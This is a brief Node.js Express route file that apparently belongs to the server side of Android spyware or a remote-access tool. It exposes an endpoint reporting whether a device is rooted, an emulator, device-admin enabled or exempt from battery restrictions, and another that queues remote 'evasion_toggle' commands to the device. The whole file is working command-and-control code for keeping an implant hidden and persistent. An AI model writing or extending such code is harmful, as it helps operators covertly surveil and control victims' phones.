const express = require('express');
const router = express.Router();
const db = require('../utils/db');
const { authMiddleware } = require('../utils/auth');

router.get('/status/:deviceId', authMiddleware, async (req, res) => {
  const result = await db.query(
    'SELECT is_rooted, is_emulator, admin_enabled, doze_whitelisted FROM devices WHERE device_id = $1',
    [req.params.deviceId]
  );
  res.json(result.rows[0] || {});
});

router.post('/toggle/:deviceId', authMiddleware, async (req, res) => {
  const { feature, enabled } = req.body;
  await db.query(
    `INSERT INTO commands (device_id, command_type, payload, priority)
     VALUES ((SELECT id FROM devices WHERE device_id = $1), 'evasion_toggle', $2, 1)`,
    [req.params.deviceId, JSON.stringify({ feature, enabled })]
  );
  res.json({ queued: true });
});

module.exports = router;
